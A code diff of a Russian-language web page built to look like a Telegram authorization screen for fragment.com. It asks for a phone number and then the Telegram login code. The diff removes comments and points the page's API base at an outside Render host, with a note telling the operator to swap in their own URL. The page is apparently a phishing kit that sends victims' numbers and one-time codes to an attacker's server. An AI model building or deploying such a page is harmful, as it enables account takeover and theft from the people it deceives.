@@ -27,7 +27,6 @@
             max-width: 380px;
         }
 
-        /* Логотипы */
         .logo-row {
             display: flex;
             justify-content: center;
@@ -66,7 +65,6 @@
             font-weight: 300;
         }
 
-        /* Тексты */
         h2 {
             font-size: 17px;
             font-weight: 600;
@@ -88,7 +86,6 @@
             display: none !important;
         }
 
-        /* Шаг 1 — ввод номера */
         .form-group {
             margin-bottom: 32px;
         }
@@ -150,7 +147,6 @@
             letter-spacing: 1px;
         }
 
-        /* Шаг 2 — ввод кода */
         .code-row {
             display: flex;
             align-items: center;
@@ -175,7 +171,6 @@
             font-weight: 400;
         }
 
-        /* Кнопки */
         .btn-row {
             display: flex;
             justify-content: flex-end;
@@ -214,7 +209,6 @@
             cursor: not-allowed;
         }
 
-        /* Уведомления */
         .toast {
             position: fixed;
             top: 20px;
@@ -239,7 +233,6 @@
             background: #d92c2c;
         }
 
-        /* Спиннер */
         .spinner {
             display: inline-block;
             width: 18px;
@@ -262,7 +255,6 @@
 <div class="toast" id="toast"></div>
 
 <div class="container">
-    <!-- Логотипы -->
     <div class="logo-row">
         <div class="logo-circle logo-fragment">
             <svg viewBox="0 0 240 240" fill="none">
@@ -279,7 +271,6 @@
         </div>
     </div>
 
-    <!-- Шаг 1: Ввод номера -->
     <div id="step-1">
         <h2>Войдите, чтобы использовать аккаунт Telegram для fragment.com</h2>
         <p class="subtitle">Авторизация через Fragment</p>
@@ -311,7 +302,6 @@
         </div>
     </div>
 
-    <!-- Шаг 2: Ввод кода -->
     <div id="step-2" class="hidden">
         <h2>Введите код для авторизации</h2>
         <p class="subtitle">Мы отправили код в Telegram. Проверьте сообщения на вашем устройстве.</p>
@@ -328,7 +318,6 @@
         </div>
     </div>
 
-    <!-- Шаг 3: Успех -->
     <div id="step-3" class="hidden">
         <h2>✅ Авторизация успешна!</h2>
         <p class="subtitle">Ваш аккаунт подтверждён. Можете вернуться в бот.</p>
@@ -336,7 +325,8 @@
 </div>
 
 <script>
-    const API_BASE = window.location.origin;
+    // ЗАМЕНИ НА СВОЙ RENDER URL
+    const API_BASE = "https://botnft-7.onrender.com/";
 
     const step1 = document.getElementById('step-1');
     const step2 = document.getElementById('step-2');
@@ -353,7 +343,6 @@
     let currentSessionId = null;
     let toastTimer = null;
 
-    // Обновление префикса при смене страны
     countrySelect.addEventListener('change', function() {
         const selected = this.options[this.selectedIndex];
         const prefix = selected.value;
@@ -364,12 +353,10 @@
         }
     });
 
-    // Кнопка Отмена
     cancelBtn1.addEventListener('click', function() {
         window.Telegram?.WebApp?.close();
     });
 
-    // Тост-уведомления
     function showToast(message, isError = false) {
         if (toastTimer) clearTimeout(toastTimer);
         toast.textContent = message;
@@ -379,7 +366,6 @@
         }, 3000);
     }
 
-    // Блокировка кнопки с лоадером
     function setLoading(btn, isLoading) {
         if (isLoading) {
             btn.disabled = true;
@@ -391,7 +377,6 @@
         }
     }
 
-    // Шаг 1 → Шаг 2: Отправка кода
     async function sendCode() {
         let phone = phoneInput.value.replace(/[\s\-\(\)]/g, '');
         
@@ -401,7 +386,6 @@
         }
 
         const prefix = prefixDisplay.textContent.trim();
-        // Убираем ведущий ноль если есть после кода страны
         const fullPhone = prefix + phone;
 
         setLoading(nextBtn, true);
@@ -432,7 +416,6 @@
         }
     }
 
-    // Назад к шагу 1
     function goBack() {
         step2.classList.add('hidden');
         step1.classList.remove('hidden');
@@ -440,7 +423,6 @@
         currentSessionId = null;
     }
 
-    // Шаг 2 → Шаг 3: Проверка кода
     async function verifyCode() {
         const code = codeInput.value.trim();
 
@@ -485,7 +467,6 @@
         }
     }
 
-    // Enter для отправки
     phoneInput.addEventListener('keydown', function(e) {
         if (e.key === 'Enter') sendCode();
     });
@@ -494,9 +475,8 @@
         if (e.key === 'Enter') verifyCode();
     });
 
-    // Автофокус на поле ввода
     phoneInput.focus();
 </script>
 
 </body>
-  </html>
+</html>
